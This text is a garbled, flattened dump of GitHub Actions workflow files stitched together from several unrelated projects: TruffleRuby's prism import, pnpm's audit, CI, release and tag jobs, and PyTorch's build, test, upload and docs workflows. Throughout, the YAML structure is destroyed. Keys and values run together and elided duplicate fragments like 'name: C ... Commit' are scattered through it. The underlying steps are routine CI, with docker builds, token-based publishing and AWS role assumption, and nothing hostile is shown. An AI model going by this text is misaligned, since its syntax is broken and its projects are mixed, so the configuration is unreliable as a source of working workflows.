"$PWD/truffleruby-ws/truffleruby/bin" >> $GITHUB_PATHmx-cache-prism-${{ runner.os }}-${{ hashFiles('truffleruby-ws/truffleruby/common.json') }}Import latest prism in TruffleRubyImport  ... fleRubytool/import-prism.shname: I ... fleRuby./truffleruby-ws/truffleruby/.github/actions/setup-jvmci-graal./truff ... i-graalParse test/prism/fixtures/**/*.txtParse t ... */*.txtjt ruby -e 'Dir.glob("test/prism/fixtures/**/*.txt") { |file| puts file; puts Truffle::Debug.parse_ast(File.read(file)) }'jt ruby ... le)) }'name: P ... */*.txtExecute p 1+2jt ruby -e 'p 1+2'name: Execute p 1+2- name: Clone Prismif: git ... leruby'test-import-prism:name: C ... t Prism/home/huawei/github-actions-security/.github/workflows/pnpm_pnpm__audit.ymlAudit[push, pull_request]Audit dependenciesCheckout Commitname: C ...  Commitpnpm/action-setup@v4.1.0pnpm/ac ... @v4.1.0standalonestandalone: truepnpm auditname: Audit- name: ...  Commitname: A ... denciesaudit:/home/huawei/github-actions-security/.github/workflows/pnpm_pnpm__ci.yml${{ github.workflow }}-${{ github.ref }}-${{ matrix.platform }}-${{ matrix.node[0] }}${{ git ... e[0] }}group:  ... e[0] }}[18, 12, 1][20, 18, 1][22, 12, 0][24, 0, 0]- [18, 12, 1]platform${{matrix.platform}} / Node.js ${{ matrix.node[0] }}${{matr ... e[0] }}${{matrix.platform}}Configure Gitgit config --global core.autocrlf false
git config --global user.name "xyz"
git config --global user.email "x@y.z"
name: Configure Gitpnpm env use -g ${{ join(matrix.node, '.') }}pnpm en ... '.') }}Install npm@8pnpm add --global npm@8pnpm ad ... l npm@8name: Install npm@8name: pnpm installrun tests (main)github.ref_name == 'main'github. ...  'main'pnpm run test-mainPNPM_WORKERSPNPM_WORKERS: 3name: r ...  (main)run tests (branch)github.ref_name != 'main'pnpm run test-branchname: r ... branch)- name: ... ure Gitconcurrency:/home/huawei/github-actions-security/.github/workflows/pnpm_pnpm__codeql-analysis.ymlv5[ main, v5 ]branche ... n, v5 ]34 7 * * 6'34 7 * * 6'cron: '34 7 * * 6'- cron: '34 7 * * 6'actions ... details[ 'javascript' ]languag ... ript' ]/home/huawei/github-actions-security/.github/workflows/pnpm_pnpm__release.ymlv*.*.*"v*.*.*"- "v*.*.*"Install ldidsudo apt-get update
sudo apt-get install git build-essential libplist-dev libssl-dev openssl qemu-user-binfmt pkg-config
cd /tmp
git clone https://gitlab.com/opensource-saurik/ldid.git
cd ldid
git submodule update --init
gcc -I. -c -o lookup2.o lookup2.c
g++ -std=c++11 -o ldid lookup2.o ldid.cpp -I. -lcrypto $(pkg-config --cflags --libs libplist-2.0) -lxml2
sudo mv ldid /usr/local/bin
name: Install ldidpnpm install --forcePublish Packagesnpm config set "//registry.npmjs.org/:_authToken" "${NPM_TOKEN}" # pnpm config set is broken
pnpm release
name: P ... ackagesCopy Artifactspnpm run copy-artifactspnpm ru ... tifactsname: Copy ArtifactsGenerate release descriptionGenerat ... riptionpnpm run make-release-descriptionpnpm ru ... riptionname: G ... riptionsoftprops/action-gh-release@v2softpro ... ease@v2dist/*RELEASE.mddraft: true/home/huawei/github-actions-security/.github/workflows/pnpm_pnpm__update-latest.ymlTagdescription: Versiondescription: Tagtag-in-registryTagging ${{ github.event.inputs.version }} as ${{ github.event.inputs.tag }}Tagging ... .tag }}Update tagnpm_config_//registry.npmjs.org/:_authToken"npm_co ... hToken""npm_co ... OKEN }}npm dist-tag add pnpm@${{ github.event.inputs.version }} latest-10
npm dist-tag add pnpm@${{ github.event.inputs.version }} ${{ github.event.inputs.tag }}
npm dist-tag add @pnpm/exe@${{ github.event.inputs.version }} latest-10
npm dist-tag add @pnpm/exe@${{ github.event.inputs.version }} ${{ github.event.inputs.tag }}
name: Update tag- name: Setup Nodename: T ... .tag }}publish-to-wingetvedantmgoyal9/winget-releaser@mainvedantm ... er@mainidentifierpnpm.pnpm${{ github.event.inputs.version }}${{ git ... sion }}release-tagv${{ github.event.inputs.version }}v${{ gi ... sion }}${{ secrets.WINGET_TOKEN }}identif ... pm.pnpmuses: v ... er@mainpost-to-redditbluwy/release-for-reddit-action@v2bluwy/r ... tion@v2${{ secrets.REDDIT_USERNAME }}${{ secrets.REDDIT_PASSWORD }}${{ secrets.REDDIT_APP_ID }}${{ sec ... P_ID }}app-secret${{ secrets.REDDIT_APP_SECRET }}${{ sec ... CRET }}subredditpnpm@${{ github.event.inputs.version }} is out!pnpm@${ ... is out!urlhttps://github.com/pnpm/pnpm/releases/tag/v${{ github.event.inputs.version }}https:/ ... sion }}usernam ... NAME }}uses: b ... tion@v2- uses: ... tion@v2post-to-mastodonSend toot to MastodonSend to ... astodonmastodoncbrgm/mastodon-github-action@v2cbrgm/m ... tion@v2pnpm@${{ github.event.inputs.version }} is out!
https://github.com/pnpm/pnpm/releases/tag/v${{ github.event.inputs.version }}
visibilitypublic"public"message: |MASTODON_URLhttps://fosstodon.org/"https: ... n.org/"MASTODON_ACCESS_TOKENMASTODO ... S_TOKEN${{ secrets.MASTODON_ACCESS_TOKEN }}MASTODO ... n.org/"name: S ... astodon- name: ... astodontag-in-registry:name: Tag/home/huawei/github-actions-security/.github/workflows/publish.ymlPuzzlename: Puzzle/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___bazel-build-test.ymlbazelbuild-environmentTop-level label for what's being built/tested.Top-lev ... tested.docker-image-nameName of the base docker image to build with.Name of ... d with.cuda-versionWhat CUDA version to build with (i.e. "11.7"), "cpu" for none.What CU ... r none.sync-tagIf this is set, our linter will use this to make sure that every other
job with the same `sync-tag` is identical.
test-matrixA JSON description of what configs to run later on.
linux.large"linux.large"Runner typebuild-environment:GIT_DEFAULT_BRANCH${{ github.event.repository.default_branch }}${{ git ... anch }}GIT_DEF ... anch }}github.repository_owner == 'pytorch'github. ... ytorch'${{ inputs.runner }}${{ steps.filter.outputs.test-matrix }}is-test-matrix-empty${{ steps.filter.outputs.is-test-matrix-empty }}${{ ste ... mpty }}keep-going${{ steps.filter.outputs.keep-going }}${{ ste ... oing }}reenabled-issues${{ steps.filter.outputs.reenabled-issues }}${{ ste ... sues }}test-ma ... trix }}Checkout PyTorchpytorch/pytorch/.github/actions/checkout-pytorch@mainpytorch ... ch@mainfetch-depth: 1name: C ... PyTorchSelect all requested test configurationsSelect  ... rations./.github/actions/filter-test-configs./.gith ... configs${{ inputs.test-matrix }}${{ inp ... trix }}name: S ... rations- name: ... PyTorchif: git ... ytorch'github.repository_owner == 'pytorch' && needs.filter.outputs.is-test-matrix-empty == 'False'github. ... 'False'${{ fromJSON(needs.filter.outputs.test-matrix) }}matrix: ... rix) }}Setup SSH (Click me for login details)Setup S ... etails)pytorch/test-infra/.github/actions/setup-ssh@mainpytorch ... sh@maingithub-secretname: S ... etails)Setup Linux./.github/actions/setup-linux./.gith ... p-linuxname: Setup LinuxCalculate docker imageCalcula ... r imagecalculate-docker-imagecalcula ... r-imagepytorch/test-infra/.github/actions/calculate-docker-image@mainpytorch ... ge@main${{ inputs.docker-image-name }}docker- ... name }}name: C ... r imagePull docker imagepytorch/test-infra/.github/actions/pull-docker-image@main${{ steps.calculate-docker-image.outputs.docker-image }}${{ ste ... mage }}docker- ... mage }}name: P ... r imageCheck if in a container runnerCheck i ...  runnercheck_container_runnercheck_c ... _runnerecho "IN_CONTAINER_RUNNER=$(if [ -f /.inarc ] || [ -f /.incontainer ]; then echo true ; else echo false; fi)" >> "$GITHUB_OUTPUT"echo "I ... OUTPUT"name: C ...  runnerInstall nvidia driver, nvidia-docker runtime, set GPU_FLAGInstall ... PU_FLAGpytorch/test-infra/.github/actions/setup-nvidia@mainpytorch ... ia@main${{ inputs.cuda-version != 'cpu' && steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'false' }}name: I ... PU_FLAGOutput disk space leftOutput  ... ce leftsudo df -H
name: O ... ce leftPreserve github env variables for use in dockerPreserv ...  dockerenv | grep '^GITHUB' >> "/tmp/github_env_${GITHUB_RUN_ID}"
env | grep '^CI' >> "/tmp/github_env_${GITHUB_RUN_ID}"
name: P ...  dockerParse refparse-ref.github/scripts/parse_ref.py.github ... _ref.pyname: Parse refGet workflow job idget-job-id./.github/actions/get-workflow-job-id./.gith ... -job-idname: G ...  job idBUILD_ENVIRONMENT${{ inputs.build-environment }}${{ steps.parse-ref.outputs.branch }}GITHUB_REPOSITORYGITHUB_WORKFLOWGITHUB_JOB${{ github.job }}GITHUB_RUN_ID${{ github.run_id }}GITHUB_RUN_NUMBER${{ github.run_number }}GITHUB_RUN_ATTEMPT${{ github.run_attempt }}JOB_ID${{ steps.get-job-id.outputs.job-id }}${{ ste ... b-id }}REENABLED_ISSUES${{ needs.filter.outputs.reenabled-issues }}${{ nee ... sues }}AWS_DEFAULT_REGIONus-east-1SHA1SCCACHE_BUCKETossci-compiler-cache-circleci-v2ossci-c ... leci-v2SCCACHE_REGIONTORCH_CUDA_ARCH_LIST5.2DOCKER_IMAGEOUR_GITHUB_JOB_IDCUDA_VERSION${{ inputs.cuda-version }}BUILD_E ... ment }}export SHARD_NUMBER=0
# detached container should get cleaned up by teardown_ec2_linux
# TODO: Stop building test binaries as part of the build phase
# Make sure we copy test results from bazel-testlogs symlink to
# a regular directory ./test/test-reports
# shellcheck disable=SC2086
container_name=$(docker run \
  ${GPU_FLAG:-} \
  -e AWS_DEFAULT_REGION \
  -e BUILD_ENVIRONMENT \
  -e GITHUB_ACTIONS \
  -e GITHUB_REPOSITORY \
  -e GITHUB_WORKFLOW \
  -e GITHUB_JOB \
  -e GITHUB_RUN_NUMBER \
  -e GITHUB_RUN_ATTEMPT \
  -e JOB_ID \
  -e GIT_DEFAULT_BRANCH="$GIT_DEFAULT_BRANCH" \
  -e SHARD_NUMBER \
  -e NUM_TEST_SHARDS \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e SCCACHE_BUCKET \
  -e SCCACHE_REGION \
  -e SKIP_SCCACHE_INITIALIZATION=1 \
  -e REENABLED_ISSUES \
  -e TORCH_CUDA_ARCH_LIST \
  -e OUR_GITHUB_JOB_ID \
  -e CUDA_VERSION \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --shm-size="1g" \
  --tty \
  --detach \
  --user jenkins \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}"
)
docker exec -t "${container_name}" sh -c '.ci/pytorch/build.sh'
echo "container_id=${container_name}" >> "${GITHUB_ENV}"
docker exec -t "${container_id}" sh -c '.ci/pytorch/test.sh && cp -Lr ./bazel-testlogs ./test/test-reports'
Print remaining test logsPrint r ... st logsalways() && steps.test.conclusionalways( ... clusioncat test/**/*_toprint.log || true
name: P ... st logsChown workspace./.github/actions/chown-workspace./.gith ... rkspaceUpload test artifacts./.github/actions/upload-test-artifacts./.gith ... tifactsalways() && steps.test.conclusion && steps.test.conclusion != 'skipped'always( ... kipped'file-suffixbazel-${{ github.job }}_${{ steps.get-job-id.outputs.job-id }}bazel-$ ... b-id }}file-su ... b-id }}Teardown Linuxpytorch/test-infra/.github/actions/teardown-linux@mainpytorch ... ux@mainname: Teardown Linux- name: ... etails)needs: filterfilter:name: bazel/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___binary-build-linux.ymllinux-binary-buildbuild_nameThe build's namebuild_environmentThe build environmentThe bui ... ronmentrunner_prefixprefix for runner labelprefix  ... r labelruns_onlinux.12xlarge.memory.ephemerallinux.1 ... hemeralHardware to run this "build" job on, linux.12xlarge or linux.arm64.2xlarge.Hardwar ... xlarge.timeout for the jobuse_split_build[Experimental] Build a libtorch only wheel and build pytorch such that
are built from the libtorch wheel.
description: |ALPINE_IMAGE308535385114.dkr.ecr.us-east-1.amazonaws.com/tool/alpine"308535 ... alpine"Alpine image to usePYTORCH_ROOTRoot directory for the pytorch/pytorch repositoryRoot di ... ositoryPACKAGE_TYPEPackage typeDESIRED_CUDADesired Cuda versionGPU_ARCH_VERSIONGPU Arch versionGPU_ARCH_TYPEGPU Arch typeDocker image to useDOCKER_IMAGE_TAG_PREFIXDOCKER_ ... _PREFIXDocker image tag to useDocker  ...  to useLIBTORCH_CONFIGDesired libtorch config (for libtorch builds only)Desired ... s only)LIBTORCH_VARIANTDesired libtorch variant (for libtorch builds only)DESIRED_PYTHONDesired python versionDesired ... versionPYTORCH_EXTRA_INSTALL_REQUIREMENTSPYTORCH ... REMENTSExtra install requirementsExtra i ... rementsbuild_name:Github Tokengithub-token:${{ inputs.runner_prefix}}${{ inputs.runs_on }}${{ inp ... s_on }}${{ inputs.timeout-minutes }}${{ inp ... utes }}${{ inputs.PYTORCH_ROOT }}${{ inp ... ROOT }}${{ inputs.PACKAGE_TYPE }}${{ inp ... TYPE }}${{ inputs.DESIRED_CUDA }}${{ inp ... CUDA }}${{ inputs.GPU_ARCH_VERSION }}${{ inp ... SION }}${{ inputs.GPU_ARCH_TYPE }}${{ inputs.DOCKER_IMAGE }}${{ inp ... MAGE }}SKIP_ALL_TESTS${{ inputs.LIBTORCH_CONFIG }}${{ inp ... NFIG }}${{ inputs.LIBTORCH_VARIANT }}${{ inp ... IANT }}${{ inputs.DESIRED_PYTHON }}${{ inp ... THON }}${{ inputs.PYTORCH_EXTRA_INSTALL_REQUIREMENTS }}${{ inp ... ENTS }}${{ inputs.ALPINE_IMAGE }}BINARY_ENV_FILE/tmp/env${{ inputs.build_environment }}${{ secrets.github-token }}${{ sec ... oken }}PYTORCH_FINAL_PACKAGE_DIRPYTORCH ... AGE_DIR/artifactsUSE_SPLIT_BUILD${{ inputs.use_split_build }}${{ inp ... uild }}PYTORCH ... ROOT }}Make the env permanent during this workflow (but not the secrets)Make th ... ecrets){
  echo "PYTORCH_ROOT=${{ env.PYTORCH_ROOT }}"
  echo "PACKAGE_TYPE=${{ env.PACKAGE_TYPE }}"
  echo "DESIRED_CUDA=${{ env.DESIRED_CUDA }}"
  echo "GPU_ARCH_VERSION=${{ env.GPU_ARCH_VERSION }}"
  echo "GPU_ARCH_TYPE=${{ env.GPU_ARCH_TYPE }}"
  echo "DOCKER_IMAGE=${{ env.DOCKER_IMAGE }}"
  echo "SKIP_ALL_TESTS=${{ env.SKIP_ALL_TESTS }}"
  echo "LIBTORCH_CONFIG=${{ env.LIBTORCH_CONFIG }}"
  echo "LIBTORCH_VARIANT=${{ env.LIBTORCH_VARIANT }}"
  echo "DESIRED_PYTHON=${{ env.DESIRED_PYTHON }}"
  echo "PYTORCH_EXTRA_INSTALL_REQUIREMENTS=${{ env.PYTORCH_EXTRA_INSTALL_REQUIREMENTS }}"
  echo "ALPINE_IMAGE=${{ env.ALPINE_IMAGE }}"
  echo "AWS_DEFAULT_REGION=${{ env.AWS_DEFAULT_REGION }}"
  echo "BINARY_ENV_FILE=${{ env.BINARY_ENV_FILE }}"
  echo "BUILD_ENVIRONMENT=${{ env.BUILD_ENVIRONMENT }}"
  echo "BUILD_NAME=${{ env.BUILD_NAME }}"
  echo "PR_NUMBER=${{ env.PR_NUMBER }}"
  echo "PYTORCH_FINAL_PACKAGE_DIR=${{ env.PYTORCH_FINAL_PACKAGE_DIR }}"
  echo "SHA1=${{ env.SHA1 }}"
  echo "USE_SPLIT_BUILD=${{ env.use_split_build }}"
} >> "${GITHUB_ENV} }}"
name: M ... ecrets)List the envname: List the env[FB EMPLOYEES] Enable SSH (Click me for login details)"[FB EM ... tails)"inputs.build_environment != 'linux-s390x-binary-manywheel'inputs. ... ywheel'name: " ... tails)"no-sudo${{ inputs.build_environment == 'linux-aarch64-binary-manywheel' || inputs.build_environment == 'linux-s390x-binary-manywheel' }}${{ inp ... eel' }}no-sudo ... eel' }}ALPINE_ ... MAGE }}Clean workspaceset -eux

rm -rf "${GITHUB_WORKSPACE}"
mkdir "${GITHUB_WORKSPACE}"

if [[ ${{ inputs.build_environment }} == 'linux-aarch64-binary-manywheel' ]] || [[ ${{ inputs.build_environment }} == 'linux-s390x-binary-manywheel' ]] ; then
  rm -rf "${RUNNER_TEMP}/artifacts"
  mkdir "${RUNNER_TEMP}/artifacts"
fi
Checkout PyTorch to pytorch dirCheckou ... rch dir${{ github.event_name == 'pull_request' && github.event.pull_request.head.sha || github.sha }}pytorchshow-progressname: C ... rch dirClean PyTorch checkoutClean P ... heckout# Remove any artifacts from the previous checkouts
git clean -fxd
name: C ... heckoutCheck if the job is disabledCheck i ... isabled./pytorch/.github/actions/filter-test-configs./pytor ... configs{ include: [
  { config: "default" },
]}
configure aws credentialsconfigu ... entialsaws_creds${{ steps.filter.outputs.is-test-matrix-empty == 'False' && inputs.build_environment != 'linux-s390x-binary-manywheel' && startsWith(github.event.ref, 'refs/tags/ciflow/') }}${{ ste ... w/') }}aws-actions/configure-aws-credentials@ececac1a45f3b08a01d2dd070d28d111c5fe6722aws-act ... 5fe6722role-to-assumearn:aws:iam::308535385114:role/gha_workflow_s3_and_ecr_read_onlyarn:aws ... ad_onlyaws-regionrole-duration-secondsrole-du ... seconds18000role-to ... ad_onlyname: c ... entials${{ steps.filter.outputs.is-test-matrix-empty == 'False' && inputs.build_environment != 'linux-s390x-binary-manywheel' }}${{ ste ... eel' }}docker-registry${{ startsWith(github.event.ref, 'refs/tags/ciflow/') && '308535385114.dkr.ecr.us-east-1.amazonaws.com' || 'docker.io' }}${{ sta ... .io' }}custom-tag-prefix${{ inputs.DOCKER_IMAGE_TAG_PREFIX }}${{ inp ... EFIX }}docker-build-dir.ci/dockerdocker- ... .io' }}Pull Docker imageBuild PyTorch binary${{ steps.filter.outputs.is-test-matrix-empty == 'False' }}${{ steps.calculate-docker-image.outputs.docker-image || format('{0}:{1}', inputs.DOCKER_IMAGE, inputs.DOCKER_IMAGE_TAG_PREFIX) }}${{ ste ... FIX) }}DOCKER_ ... FIX) }}set -x
mkdir -p artifacts/
container_name=$(docker run \
  -e BINARY_ENV_FILE \
  -e BUILD_ENVIRONMENT \
  -e DESIRED_CUDA \
  -e DESIRED_PYTHON \
  -e GITHUB_ACTIONS \
  -e GPU_ARCH_TYPE \
  -e GPU_ARCH_VERSION \
  -e LIBTORCH_VARIANT \
  -e PACKAGE_TYPE \
  -e PYTORCH_FINAL_PACKAGE_DIR \
  -e PYTORCH_ROOT \
  -e SKIP_ALL_TESTS \
  -e PYTORCH_EXTRA_INSTALL_REQUIREMENTS \
  -e USE_SPLIT_BUILD \
  --tty \
  --detach \
  -v "${GITHUB_WORKSPACE}/pytorch:/pytorch" \
  -v "${RUNNER_TEMP}/artifacts:/artifacts" \
  -w / \
  "${DOCKER_IMAGE}"
)
docker exec -t -w "${PYTORCH_ROOT}" "${container_name}" bash -c "bash .circleci/scripts/binary_populate_env.sh"
if [[ ${BUILD_ENVIRONMENT} == *"aarch64"* ]]; then
  docker exec -t "${container_name}" bash -c "source ${BINARY_ENV_FILE} && bash /pytorch/.ci/aarch64_linux/aarch64_ci_build.sh"
else
  docker exec -t "${container_name}" bash -c "source ${BINARY_ENV_FILE} && bash /pytorch/.ci/${{ inputs.PACKAGE_TYPE }}/build.sh"
fi
name: B ...  binaryChown artifacts# Ensure the working directory gets chowned back to the current user
docker run --rm -v "${RUNNER_TEMP}/artifacts:/v" -w /v "${ALPINE_IMAGE}" chown -R "$(id -u):$(id -g)" .
name: C ... tifactsactions/upload-artifact@50769540e7f4bd5e21e526ee35c689e35e0d6874actions ... e0d6874${{ inputs.build_name }}${{ runner.temp }}/artifacts/*${{ run ... facts/*always() && inputs.build_environment != 'linux-s390x-binary-manywheel'always( ... ywheel'./pytorch/.github/actions/chown-workspace./pytor ... rkspaceCleanup dockeralways() && inputs.build_environment == 'linux-s390x-binary-manywheel'# on s390x stop the container for clean worker stop
# ignore expansion of "docker ps -q" since it could be empty
# shellcheck disable=SC2046
docker stop $(docker ps -q) || true
name: Cleanup docker- name: ... ecrets)runs-on ... s_on }}name: l ... y-build/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___binary-test-linux.ymllinux-binary-testHardware to run this job on. Valid values are linux.4xlarge, linux.4xlarge.nvidia.gpu, linux.arm64.2xlarge, and linux.rocm.gpuHardwar ... ocm.gpu{
  echo "PYTORCH_ROOT=${{ env.PYTORCH_ROOT }}"
  echo "PACKAGE_TYPE=${{ env.PACKAGE_TYPE }}"

  echo "DESIRED_CUDA=${{ env.DESIRED_CUDA }}"
  echo "GPU_ARCH_VERSION=${{ env.GPU_ARCH_VERSION }}"
  echo "GPU_ARCH_TYPE=${{ env.GPU_ARCH_TYPE }}"
  echo "DOCKER_IMAGE=${{ env.DOCKER_IMAGE }}"
  echo "SKIP_ALL_TESTS=${{ env.SKIP_ALL_TESTS }}"
  echo "LIBTORCH_CONFIG=${{ env.LIBTORCH_CONFIG }}"
  echo "LIBTORCH_VARIANT=${{ env.LIBTORCH_VARIANT }}"
  echo "DESIRED_PYTHON=${{ env.DESIRED_PYTHON }}"

  echo "ALPINE_IMAGE=${{ env.ALPINE_IMAGE }}"
  echo "AWS_DEFAULT_REGION=${{ env.AWS_DEFAULT_REGION }}"
  echo "BINARY_ENV_FILE=${{ env.BINARY_ENV_FILE }}"
  echo "BUILD_ENVIRONMENT=${{ env.BUILD_ENVIRONMENT }}"
  echo "PR_NUMBER=${{ env.PR_NUMBER }}"
  echo "PYTORCH_FINAL_PACKAGE_DIR=${{ env.PYTORCH_FINAL_PACKAGE_DIR }}"
  echo "SHA1=${{ env.SHA1 }}"
  echo "USE_SPLIT_BUILD=${{ env.USE_SPLIT_BUILD }}"
} >> "${GITHUB_ENV} }}"
rm -rf "${GITHUB_WORKSPACE}"
mkdir "${GITHUB_WORKSPACE}"
Download Build Artifactsactions/download-artifact@65a9edc5881444af0b9093a5e628f2fe47ea3b2eactions ... 7ea3b2e${{ runner.temp }}/artifacts/"${{ ru ... facts/"${{ inputs.GPU_ARCH_TYPE == 'cuda' && steps.filter.outputs.is-test-matrix-empty == 'False' }}Test Pytorch binary./pytorch/.github/actions/test-pytorch-binary./pytor ... -binaryname: T ...  binaryname: l ... ry-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___binary-upload.ymluse_s3If true, will download artifacts from s3. Otherwise will use the default GitHub artifact download actionIf true ...  actionRoot directory for the pytorch/pytorch repository. Not actually needed, but currently passing it in since we pass in the same inputs to the reusable workflows of all binary buildsRoot di ...  buildsDesired CUDA versioncontinuumio/miniconda3:4.12.0continu ... :4.12.0image:  ... :4.12.0/pytorchPYTORCH ... pytorchno-sudo: trueConfigure AWS credentials(PyTorch account) for nightlyConfigu ... nightly${{ github.event_name == 'push' && github.event.ref == 'refs/heads/nightly' }}${{ git ... tly' }}arn:aws:iam::749337293305:role/gha_workflow_nightly_build_wheelsarn:aws ... _wheelsrole-to ... _wheelsname: C ... nightlyConfigure AWS credentials(PyTorch account) for RC buildsConfigu ...  builds${{ github.event_name == 'push' &&  (startsWith(github.event.ref, 'refs/tags/') && !startsWith(github.event.ref, 'refs/tags/ciflow/')) }}${{ git ... /')) }}arn:aws:iam::749337293305:role/gha_workflow_test_build_wheelsname: C ...  buildsdownload-artifactsSet DRY_RUN (only for tagged pushes)Set DRY ... pushes)${{ github.event_name == 'push' && (github.event.ref == 'refs/heads/nightly' || (startsWith(github.event.ref, 'refs/tags/') && !startsWith(github.event.ref, 'refs/tags/ciflow/'))) }}${{ git ... '))) }}echo "DRY_RUN=disabled" >> "$GITHUB_ENV"
name: S ... pushes)Set UPLOAD_CHANNEL (only for tagged pushes)Set UPL ... pushes)${{ github.event_name == 'push' && startsWith(github.event.ref, 'refs/tags/') && !startsWith(github.event.ref, 'refs/tags/ciflow/') }}${{ git ... w/') }}bash -e -l {0}# reference ends with an RC suffix
if [[ "${GITHUB_REF_NAME}" = *-rc[0-9]* ]]; then
  echo "UPLOAD_CHANNEL=test" >> "$GITHUB_ENV"
fi
Upload binariessteps.download-artifacts.outcome && steps.download-artifacts.outcome == 'success'steps.d ... uccess'PKG_DIR${{ runner.temp }}/artifacts"${{ ru ... ifacts"UPLOAD_SUBFOLDER${{ env.DESIRED_CUDA }}"${{ en ... UDA }}"BUILD_NAMEPKG_DIR ... ifacts"set -ex
bash .circleci/scripts/binary_upload.sh
name: U ... inariesupload:name: upload/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___docs.ymlbuild docsDocker image to run in.Docker  ... run in.If set, push the docs to the docs website.If set, ... ebsite.run-doxygenIf set, will enable C++ API doc generation using doxygen / breathe / exhale.If set, ... exhale.s3-bucketS3 bucket to download artifactS3 buck ... rtifactgha-artifacts"gha-artifacts"descrip ... rtifactaws-role-to-assumerole to assume for downloading artifactsrole to ... tifactsdescrip ... tifactsupload-aws-role-to-assumeupload- ... -assumedescrip ... r labelGH_PYTORCHBOT_TOKENPermissions for pushing to the docs site.Permiss ... s site.GH_PYTORCHBOT_TOKEN:build-docs${{ (github.ref == 'refs/heads/main' || startsWith(github.event.ref, 'refs/tags/v')) && 'pytorchbot-env' || '' }}${{ (gi ... | '' }}docs_type${{ inputs.runner_prefix }}linux.12xlarge${{ inp ... 2xlargedocs_type: cpp${{ inputs.runner_prefix }}linux.2xlargedocs_type: pythonfunctorchdocs_type: functorch- docs_type: cppbuild-docs-${{ matrix.docs_type }}-${{ inputs.push }}build-d ... push }}All builds are done inside the container, to start an interactive session run:
  docker exec -it $(docker container ps --format '{{.ID}}') bash
To start Python docs build type:
  cd docs && make html && make coverage
${{ inputs.aws-role-to-assume != '' }}${{ inp ... = '' }}${{ inputs.aws-role-to-assume }}${{ inp ... sume }}role-session-namegha-linux-testrole-to ... sume }}${{ inputs.docker-image }}${{ inp ... mage }}Download build artifacts./.github/actions/download-build-artifacts${{ inputs.s3-bucket }}${{ inp ... cket }}name: $ ... ment }}Generate netrc (only for docs-push)Generat ... s-push)inputs.pushGITHUB_PYTORCHBOT_TOKENGITHUB_ ... T_TOKEN${{ secrets.GH_PYTORCHBOT_TOKEN }}# sometimes .netrc exists as a directory even though this is the temp folder
rm -rf "${RUNNER_TEMP}/.netrc"
# set credentials for https pushing
echo "machine github.com" > "${RUNNER_TEMP}/.netrc"
echo "login pytorchbot" >> "${RUNNER_TEMP}/.netrc"
echo "password ${GITHUB_PYTORCHBOT_TOKEN}" >> "${RUNNER_TEMP}/.netrc"
name: G ... s-push)Build ${{ matrix.docs_type }} docsBuild $ ... }} docs${{ matrix.timeout-minutes }}${{ mat ... utes }}WITH_PUSH${{ inputs.push }}DOCS_TYPE${{ matrix.docs_type }}RUN_DOXYGEN${{ inputs.run-doxygen }}${{ inp ... ygen }}WITH_PU ... push }}set -ex
# Convert refs/tags/v1.12.0rc3 into 1.12
if [[ "${GITHUB_REF}" =~ ^refs/tags/v([0-9]+\.[0-9]+)\.* ]]; then
  target="${BASH_REMATCH[1]}"
else
  target="main"
fi
# detached container should get cleaned up by teardown_ec2_linux
container_name=$(docker run \
  -e BUILD_ENVIRONMENT \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e SHA1="$GITHUB_SHA" \
  -e DOCS_VERSION="${target}" \
  -e DOCS_TYPE \
  -e RUN_DOXYGEN \
  -e WITH_PUSH \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --tty \
  --detach \
  --user jenkins \
  -v "${RUNNER_TEMP}/.netrc":/var/lib/jenkins/.netrc \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}"
)
docker exec -t "${container_name}" bash -c "sudo chown -R jenkins . && pip install $(echo dist/*.whl)[opt-einsum] && ./.ci/pytorch/${DOCS_TYPE}_doc_push_script.sh"
name: B ... }} docs${{ inputs.upload-aws-role-to-assume != '' }}${{ inputs.upload-aws-role-to-assume }}Upload Python Docs PreviewUpload  ... Previewseemethere/upload-artifact-s3@baba72d0712b404f646cebe0730933554ebce96aseemeth ... ebce96a${{ github.event_name == 'pull_request' && matrix.docs_type == 'python' && steps.build-docs.outcome == 'success' }}${{ git ... ess' }}doc-previewspytorch_docs/main/s3-prefixpytorch/pytorch/${{ github.event.pull_request.number }}pytorch ... mber }}retention-days: 14name: U ... PreviewUpload C++ Docs Preview${{ github.event_name == 'pull_request' && matrix.docs_type == 'cpp' && steps.build-docs.outcome == 'success' }}cppdocs/pytorch/pytorch/${{ github.event.pull_request.number }}/cppdocspytorch ... cppdocsUpload functorch Docs Preview${{ github.event_name == 'pull_request' && matrix.docs_type == 'functorch' && steps.build-docs.outcome == 'success' }}functorch_ghpages/nightly/functor ... ightly/pytorch/pytorch/${{ github.event.pull_request.number }}/functorchdocspytorch ... rchdocsbuild-docs:name: build docs/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___link_check.ymlrun-url-lintrunner:lint-urls${{ inputs.run-url-lint }}${{ inp ... lint }}pytorch/test-infra/.github/workflows/linux_job_v2.yml@mainpytorch ... ml@maintimeout${{ inputs.runner }}linux.2xlargepytorch-linux-focal-linterpytorch ... -linter${{ inputs.ref }}./scripts/lint_urls.sh $(
  { [ "${{ github.event_name }}" = "pull_request" ] \
      && git diff --name-only "${{ github.event.pull_request.base.sha }}...${{ github.event.pull_request.head.sha }}"; } \
  || \
  { [ "${{ github.event_name }}" = "push" ] \
      && git diff --name-only "${{ github.event.before }}...${{ github.sha }}"; }
) || {
  echo
  echo "URL lint failed."
  echo "If this is a transient outage, you can bypass it by adding the \`skip-url-lint\` label to your PR."
  echo "Or add \`@lint-ignore\` somewhere on the same line as the URL you want to skip checking."
  exit 1
}
